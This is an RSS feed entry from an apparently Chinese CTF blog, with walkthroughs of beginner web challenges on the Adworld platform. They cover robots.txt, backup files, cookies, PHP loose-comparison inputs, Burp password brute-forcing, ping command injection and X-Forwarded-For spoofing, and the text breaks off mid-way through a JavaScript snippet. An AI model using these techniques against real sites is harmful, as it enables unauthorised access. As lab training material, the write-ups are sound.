<?xml version="1.0"?>
<rss version="2.0">
    <channel>
        <title> • Posts by &#34;wp&#34; category</title>
        <link>http://example.com</link>
        <description>欢迎来到Huan的笔记空间~这里主要会记录pwn笔记🌸</description>
        <language>zh-CN</language>
        <pubDate>Thu, 24 Aug 2023 23:55:12 +0800</pubDate>
        <lastBuildDate>Thu, 24 Aug 2023 23:55:12 +0800</lastBuildDate>
        <category>wp</category>
        <category>pie</category>
        <category>canary</category>
        <category>格式化字符串漏洞</category>
        <category>堆</category>
        <category>csu</category>
        <category>rop</category>
        <category>gdb</category>
        <category>格式化字符串</category>
        <category>got表</category>
        <category>unlink</category>
        <category>srop</category>
        <category>uaf</category>
        <category>got改写</category>
        <category>随机数检查</category>
        <item>
            <guid isPermalink="true">http://example.com/2023/08/24/web-new/</guid>
            <title>web_new</title>
            <link>http://example.com/2023/08/24/web-new/</link>
            <category>wp</category>
            <pubDate>Thu, 24 Aug 2023 23:55:12 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;web新手&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#web新手&#34;&gt;#&lt;/a&gt; web 新手：&lt;/h1&gt;
&lt;p&gt;攻防世界 WEB 区复现：&lt;/p&gt;
&lt;h2 id=&#34;robots&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#robots&#34;&gt;#&lt;/a&gt; robots:&amp;gt;&lt;/h2&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/webpic/image-20230824195924438.png&#34; alt=&#34;image-20230824195924438&#34;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;robots.txt 文件是一个文本文件，使用任何一个常见的文本编辑器，比如 Windows 系统安装了 Notepad，就可以创建和编辑它&lt;/p&gt;
&lt;p&gt;robots.txt 是一个协议，而不是一个命令。robots.txt 是搜索引擎中访问网站的时候要查看的第一个文件。robots.txt 文件告诉蜘蛛程序在服务器上什么文件是可以被查看的。&lt;/p&gt;
&lt;p&gt;当一个搜索蜘蛛访问一个站点时，它会首先检查该站点根目录下是否存在 robots.txt，如果存在，搜索机器人就会按照该文件中的内容来确定访问的范围；如果该文件不存在，所有的搜索蜘蛛将能够访问网站上所有没有被口令保护的页面。百度官方建议，仅当您的网站包含不希望被搜索引擎收录的内容时，才需要使用 robots.txt 文件。如果您希望搜索引擎收录网站上所有内容，请勿建立 robots.txt 文件。&lt;/p&gt;
&lt;p&gt;如果将网站视为酒店里的一个房间，robots.txt 就是主人在房间门口悬挂的 “请勿打扰” 或 “欢迎打扫” 的提示牌。这个文件告诉来访的搜索引擎哪些房间可以进入和参观，哪些房间因为存放贵重物品，或可能涉及住户及访客的隐私而不对搜索引擎开放。但 robots.txt 不是命令，也不是防火墙，如同守门人无法阻止窃贼等恶意闯入者。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/webpic/image-20230824200258007.png&#34; alt=&#34;image-20230824200258007&#34;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;拙见：Disallow 就是禁止的意思&lt;/p&gt;
&lt;p&gt;​		   Allow 就是允许的意思&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;回归该题：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/webpic/image-20230824200522350.png&#34; alt=&#34;image-20230824200522350&#34;&gt;&lt;/p&gt;
&lt;p&gt;当我们去访问 robots.txt 的时候，发现所有的搜索引擎不允许去访问  f1ag_1s_h3re.php 文件，说明这是敏感信息。根据提示，我们去访问这个文件。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/webpic/image-20230824201130674.png&#34; alt=&#34;image-20230824201130674&#34;&gt;&lt;/p&gt;
&lt;p&gt;成功获取 flag。&lt;/p&gt;
&lt;h2 id=&#34;backup&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#backup&#34;&gt;#&lt;/a&gt; backup:&amp;gt;&lt;/h2&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/webpic/image-20230824201515063.png&#34; alt=&#34;image-20230824201515063&#34;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;提示是去寻找备份文件&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;打开界面：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/webpic/image-20230824201448729.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;很容易想到，这里要找 index.php 的备份文件。&lt;/p&gt;
&lt;p&gt;web 网页常见的备份文件后缀名：“.git”,“.svn”,“.swp”,“.~”,“.bak”,“.bash_history”,“.bkf”&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/webpic/image-20230824201722649.png&#34; alt=&#34;image-20230824201722649&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/webpic/image-20230824201755816.png&#34; alt=&#34;image-20230824201755816&#34;&gt;&lt;/p&gt;
&lt;p&gt;获取 flag。&lt;/p&gt;
&lt;h2 id=&#34;cookie&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#cookie&#34;&gt;#&lt;/a&gt; cookie:&amp;gt;&lt;/h2&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/webpic/image-20230824201926829.png&#34; alt=&#34;image-20230824201926829&#34;&gt;&lt;/p&gt;
&lt;p&gt;根据提示，cookie 里面有东西。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/webpic/image-20230824202025146.png&#34; alt=&#34;image-20230824202025146&#34;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Cookie 是一种存储在计算机浏览器目录中的文本文件。当用户浏览某个站点并注册帐号，就会生成一个 Cookie 文件用于记录登录信息。目前，大多数网站都会应用 Cookie 技术，这既能给用户提供一个好的网络环境，又能方便收集访客信息。&lt;/p&gt;
&lt;h2 id=&#34;cookie有哪些特性&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#cookie有哪些特性&#34;&gt;#&lt;/a&gt; Cookie 有哪些特性:&lt;/h2&gt;
&lt;p&gt;首先，是 Cookie 的实效性。目前有些 Cookie 是临时的，有些则是持续的。临时的 Cookie 只在浏览器上保存一段规定的时间，一旦超过规定的时间，该 Cookie 就会被系统清除。&lt;/p&gt;
&lt;p&gt;其次，是 Cookie 的限制性。Cookie 必须在 HTML 文件的内容输出之前设置；不同的浏览器 (Netscape Navigator、Internet Explorer) 对 Cookie 的处理不一致，使用时一定要考虑；客户端用户如果设置禁止 Cookie，则 Cookie 不能建立。 并且在客户端，一个浏览器能创建的 Cookie 数量最多为 300 个，并且每个不能超过 4KB，每个 Web 站点能设置的 Cookie 总数不能超过 20 个。&lt;/p&gt;
&lt;h2 id=&#34;cookie有什么作用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#cookie有什么作用&#34;&gt;#&lt;/a&gt; Cookie 有什么作用:&lt;/h2&gt;
&lt;p&gt;Cookie 对于网站开发者而言，从某个角度理解更像浏览器的 “缓存” 它清晰的记录你的行为指标，有利于：&lt;/p&gt;
&lt;p&gt;（1）获取精准的访客画像：用户位置、访问喜好、年龄结构、特定账号信息等。&lt;/p&gt;
&lt;p&gt;（2）广告联盟：提供更加精准的相关产品信息，这也是为什么，当你搜索某个产品以后，在各大电商网站或带有广告联盟代码的站点，经常出现同类产品的原因。&lt;/p&gt;
&lt;p&gt;（3）推进更多个性化的内容信息，延迟页面停留时间，提高转化率。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这里我们采用 burp 抓一下包：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/webpic/image-20230824202352929.png&#34; alt=&#34;image-20230824202352929&#34;&gt;&lt;/p&gt;
&lt;p&gt;发现有一个 cookie.php, 尝试一下：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/webpic/image-20230824202455049.png&#34; alt=&#34;image-20230824202455049&#34;&gt;&lt;/p&gt;
&lt;p&gt;当我们传到 url 上的时候，提示我们请看 http response，所以 cookie 应该是在响应包的一个东西。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/webpic/image-20230824202815382.png&#34; alt=&#34;image-20230824202815382&#34;&gt;&lt;/p&gt;
&lt;p&gt;成功获取 flag。&lt;/p&gt;
&lt;h2 id=&#34;disabled_button&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#disabled_button&#34;&gt;#&lt;/a&gt; disabled_button:&amp;gt;&lt;/h2&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/webpic/image-20230824203157237.png&#34; alt=&#34;image-20230824203157237&#34;&gt;&lt;/p&gt;
&lt;p&gt;当我们打开网页：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/webpic/image-20230824203237567.png&#34; alt=&#34;image-20230824203237567&#34;&gt;&lt;/p&gt;
&lt;p&gt;发现此按钮不能按下去。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/webpic/image-20230824203315948.png&#34; alt=&#34;image-20230824203315948&#34;&gt;&lt;/p&gt;
&lt;p&gt;f12 查看源码，发现输入有上面的字段：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;当 input 的属性设置为 disabled=“disabled“时，表单不会提交此 input 的数据&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;disabled：对于全部的表单元素都有效，包括 select, radio, checkbox, button 等。若是一个输入项的 disabled 设为 true，则该表单输入项不能获取焦点，用户的全部操做（鼠标点击和键盘输入等）对该输入项都无效，最重要的一点是当提交表单时，这个表单输入项将不会被提交。&lt;/p&gt;
&lt;p&gt;readonly：只针对 input (text /password) 和 textarea 有效；若是设为 true，用户只是不能编辑对应的文本，可是仍然能够聚焦焦点，而且在提交表单的时候，该输入项会做为 form 的一项提交。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;所以我们将其删掉就行。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/webpic/image-20230824203628188.png&#34; alt=&#34;image-20230824203628188&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/webpic/image-20230824203644118.png&#34; alt=&#34;image-20230824203644118&#34;&gt;&lt;/p&gt;
&lt;p&gt;得到 flag&lt;/p&gt;
&lt;h2 id=&#34;get_post&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#get_post&#34;&gt;#&lt;/a&gt; get_post:&amp;gt;&lt;/h2&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/webpic/image-20230824203743132.png&#34; alt=&#34;image-20230824203743132&#34;&gt;&lt;/p&gt;
&lt;p&gt;两种请求方式：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/webpic/image-20230824204018624.png&#34; alt=&#34;image-20230824204018624&#34;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;GET 请求直接在 url 后，进行参数的添加。&lt;/p&gt;
&lt;p&gt;POST 请求需要借助 hackbar。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;另外几种请求：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/webpic/image-20230824204218269.png&#34; alt=&#34;image-20230824204218269&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/webpic/image-20230824204233311.png&#34; alt=&#34;image-20230824204233311&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/webpic/image-20230824204248645.png&#34; alt=&#34;image-20230824204248645&#34;&gt;&lt;/p&gt;
&lt;p&gt;回归题目：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/webpic/image-20230824204355681.png&#34; alt=&#34;image-20230824204355681&#34;&gt;&lt;/p&gt;
&lt;p&gt;得到 flag&lt;/p&gt;
&lt;h2 id=&#34;weak_auth&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#weak_auth&#34;&gt;#&lt;/a&gt; weak_auth:&amp;gt;&lt;/h2&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/webpic/image-20230824204503329.png&#34; alt=&#34;image-20230824204503329&#34;&gt;&lt;/p&gt;
&lt;p&gt;题目是个弱密码题目：&lt;/p&gt;
&lt;p&gt;可以直接猜简单密码进行登录，也可以用 burp 进行爆破。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/webpic/image-20230824204634276.png&#34; alt=&#34;image-20230824204634276&#34;&gt;&lt;/p&gt;
&lt;p&gt;进入网页后是这样的界面。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/webpic/image-20230824204721446.png&#34; alt=&#34;image-20230824204721446&#34;&gt;&lt;/p&gt;
&lt;p&gt;当我们输入用户名时，提示我们用 admin 去登录。所以这题我们只需要去爆破密码即可。&lt;/p&gt;
&lt;p&gt;当我们请求操作时，拦截下来这样的数据包。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/webpic/image-20230824204915845.png&#34; alt=&#34;image-20230824204915845&#34;&gt;&lt;/p&gt;
&lt;p&gt;这样去构造 payload 去进行爆破密码&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/webpic/image-20230824205021958.png&#34; alt=&#34;image-20230824205021958&#34;&gt;&lt;/p&gt;
&lt;p&gt;加载我们的密码字典，开始攻击&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/webpic/image-20230824205112705.png&#34; alt=&#34;image-20230824205112705&#34;&gt;&lt;/p&gt;
&lt;p&gt;从长度获知密码应为 123456&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/webpic/image-20230824205327991.png&#34; alt=&#34;image-20230824205327991&#34;&gt;&lt;/p&gt;
&lt;p&gt;查看响应包：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/webpic/image-20230824205351133.png&#34; alt=&#34;image-20230824205351133&#34;&gt;&lt;/p&gt;
&lt;p&gt;得到 flag&lt;/p&gt;
&lt;h2 id=&#34;simple_php&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#simple_php&#34;&gt;#&lt;/a&gt; simple_php:&amp;gt;&lt;/h2&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/webpic/image-20230824205450364.png&#34; alt=&#34;image-20230824205450364&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/webpic/image-20230824205521655.png&#34; alt=&#34;image-20230824205521655&#34;&gt;&lt;/p&gt;
&lt;p&gt;发现是 php 去需要判断的再能获取两个部分的 flag 的。&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;span&gt;p&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$a&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$a&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;blockquote&gt;
&lt;p&gt;== 弱类型比较。需要了解 php 类型比较的特性。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;PHP 类型比较&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;松散比较：使用两个等号 == 比较，只比较值，不比较类型。&lt;/li&gt;
&lt;li&gt;严格比较：用三个等号 === 比较，除了比较值，也比较类型。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;** 方法：**php 中的弱类型比较会使’abc’ == 0 为真，所以输入 a=abc 时，可得到 flag1&lt;/p&gt;
&lt;/blockquote&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;span&gt;p&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;is_numeric&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$b&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$b&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1234&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;blockquote&gt;
&lt;p&gt;is_numeric () 函数会判断如果是数字和数字字符串则返回 TRUE，否则返回 FALSE, 且 php 中弱类型比较时，会使 (‘1234a’ == 1234)&lt;/p&gt;
&lt;p&gt;** 方法：** 输入 b=1235c 即可。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/webpic/image-20230824210310021.png&#34; alt=&#34;image-20230824210310021&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;command_execution&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#command_execution&#34;&gt;#&lt;/a&gt; command_execution:&amp;gt;&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;命令执行&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/webpic/image-20230824210429004.png&#34; alt=&#34;image-20230824210429004&#34;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;WAF:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Web 应用程序防火墙（有时也简称为 WAF ）可以通过监视和过滤 Internet 与网站之间的 HTTP 通信来保护网站。&lt;/p&gt;
&lt;p&gt;一个 WAF 可以防止网站受跨站请求伪造的喜欢（被攻击 CSRF），本地文件包含（LFI），SQL 注入，跨站点脚本（XSS），等等。&lt;/p&gt;
&lt;p&gt;输入验证效果不佳的网站可能容易受到代码注入漏洞的攻击，这使攻击者试图让 SQL 语句潜行以访问未经授权的数据库。WAF 可以检测并阻止这些尝试。过时的库和软件也是易受攻击的领域，但 Web 应用程序防火墙可以用作临时解决方案，并阻止这些漏洞，并对其进行修补。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;题目：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/webpic/image-20230824210729558.png&#34; alt=&#34;image-20230824210729558&#34;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;ping 用于确定本地主机是否能与另一台主机成功交换 (发送与接收) 数据包，再根据返回的信息，就可以推断 TCP/IP 参数是否设置正确，以及运行是否正常、网络是否通畅等&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/webpic/image-20230824211021366.png&#34; alt=&#34;image-20230824211021366&#34;&gt;&lt;/p&gt;
&lt;p&gt;发现有回显，这下来进行拼接，执行命令注入：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/webpic/image-20230824211133151.png&#34; alt=&#34;image-20230824211133151&#34;&gt;&lt;/p&gt;
&lt;p&gt;发现 ls 被执行。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/webpic/image-20230824211309540.png&#34; alt=&#34;image-20230824211309540&#34;&gt;&lt;/p&gt;
&lt;p&gt;找到 flag 位置&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/webpic/image-20230824211410392.png&#34; alt=&#34;image-20230824211410392&#34;&gt;&lt;/p&gt;
&lt;p&gt;得到 flag&lt;/p&gt;
&lt;h2 id=&#34;xff_referer&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#xff_referer&#34;&gt;#&lt;/a&gt; xff_referer:&amp;gt;&lt;/h2&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/webpic/image-20230824211448543.png&#34; alt=&#34;image-20230824211448543&#34;&gt;&lt;/p&gt;
&lt;p&gt;记录一下：&amp;gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;​	**User-Agent：** 使得服务器能够识别客户使用的操作系统，浏览器版本等.（很多数据量大的网站中会记录客户使用的操作系统或浏览器版本等存入数据库中）&lt;/p&gt;
&lt;p&gt;​	**Cookie：** 网站为了辨别用户身份进行 session 跟踪，并储存在用户本地终端上的数据（通常经过加密）&lt;/p&gt;
&lt;p&gt;​	 &lt;strong&gt;X-Forwarded-For&lt;/strong&gt;：简称 XFF 头，代表了 HTTP 的请求端真实的 IP。它被认为是客户端通过 HTTP 代理或者负载均衡器连接到 web 服务端获取源 ip 地址的一个标准（通常一些网站的防注入功能会记录请求端真实 IP 地址并写入数据库或某文件 [通过修改 XXF 头可以实现伪造 IP]）。&lt;/p&gt;
&lt;p&gt;​	**Referer：** 浏览器向 WEB 服务器表明自己的页面来源。&lt;/p&gt;
&lt;p&gt;​	**Host：** 客户端指定自己想访问的 WEB 服务器的域名 / IP 地址和端口号。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;02XFF 注入的概念&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;​	XFF，是 X-Forwarded-for 的缩写，属于 SQL 注入的一种，该注入原理是通过修改 X-Forwarded-for 头对带入系统的 dns 进行 sql 注入，达到欺骗服务器执行恶意的 SQL 命令的效果，从而可以得到网站的数据库内容。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;03XFF 的危害&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;​	①数据库信息泄漏：数据库中存放的用户的隐私信息的泄露。&lt;/p&gt;
&lt;p&gt;​	②网页篡改：通过操作数据库对特定网页进行篡改。&lt;/p&gt;
&lt;p&gt;​	③网站被挂马，传播恶意软件：修改数据库一些字段的值，嵌入网马链接，进行挂马攻击。&lt;/p&gt;
&lt;p&gt;​	④数据库被恶意操作：数据库服务器被攻击，数据库的系统管理员帐户被窜改。&lt;/p&gt;
&lt;p&gt;​	⑤服务器被远程控制，被安装后门。经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/webpic/image-20230824212024008.png&#34; alt=&#34;image-20230824212024008&#34;&gt;&lt;/p&gt;
&lt;p&gt;题目：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/webpic/image-20230824211956203.png&#34; alt=&#34;image-20230824211956203&#34;&gt;&lt;/p&gt;
&lt;p&gt;提示 ip 必须 123.123.123.123，利用 xff 伪造 ip。&lt;/p&gt;
&lt;p&gt;使用 burp&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/webpic/image-20230824215131470.png&#34; alt=&#34;image-20230824215131470&#34;&gt;&lt;/p&gt;
&lt;p&gt;进行请求伪造：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/webpic/image-20230824215155754.png&#34; alt=&#34;image-20230824215155754&#34;&gt;&lt;/p&gt;
&lt;p&gt;得到 flag&lt;/p&gt;
&lt;h2 id=&#34;training-www-robots&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#training-www-robots&#34;&gt;#&lt;/a&gt; Training-WWW-Robots:&amp;gt;&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;很明显，这还是一个和 Robots 有关的题目&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/webpic/image-20230824215510884.png&#34; alt=&#34;image-20230824215510884&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/webpic/image-20230824215659606.png&#34; alt=&#34;image-20230824215659606&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/webpic/image-20230824215731279.png&#34; alt=&#34;image-20230824215731279&#34;&gt;&lt;/p&gt;
&lt;p&gt;得到 flag&lt;/p&gt;
&lt;h2 id=&#34;simple_js&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#simple_js&#34;&gt;#&lt;/a&gt; simple_js:&amp;gt;&lt;/h2&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/webpic/image-20230824215817083.png&#34; alt=&#34;image-20230824215817083&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/webpic/image-20230824215915164.png&#34; alt=&#34;image-20230824215915164&#34;&gt;&lt;/p&gt;
&lt;p&gt;题目界面&lt;/p&gt;
&lt;p&gt;用 burp 抓一下包。看下响应的情况。&lt;/p&gt;
&lt;figure class=&#34;highlight js&#34;&gt;&lt;figcaption data-lang=&#34;JavaScript&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;dechiffre&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token parameter&#34;&gt;pass_enc&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;    &lt;span class=&#34;token comment&#34;&gt;// 传入的密码&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;var&lt;/span&gt; pass &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;// 需要比对的密码  // 这是报错信息  FAUX PASSWORD HAHA&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;var&lt;/span&gt; tab  &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; pass_enc&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;split&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;,&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;           &lt;span class=&#34;token comment&#34;&gt;// 对传入的密码插入&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                &lt;span class=&#34;token keyword&#34;&gt;var&lt;/span&gt; tab2 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; pass&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;split&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;,&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;var&lt;/span&gt; i&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;j&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;k&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;l&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;m&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;n&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;o&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;p &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;&#34;&lt;/span&gt;&lt;span class=&#34;token 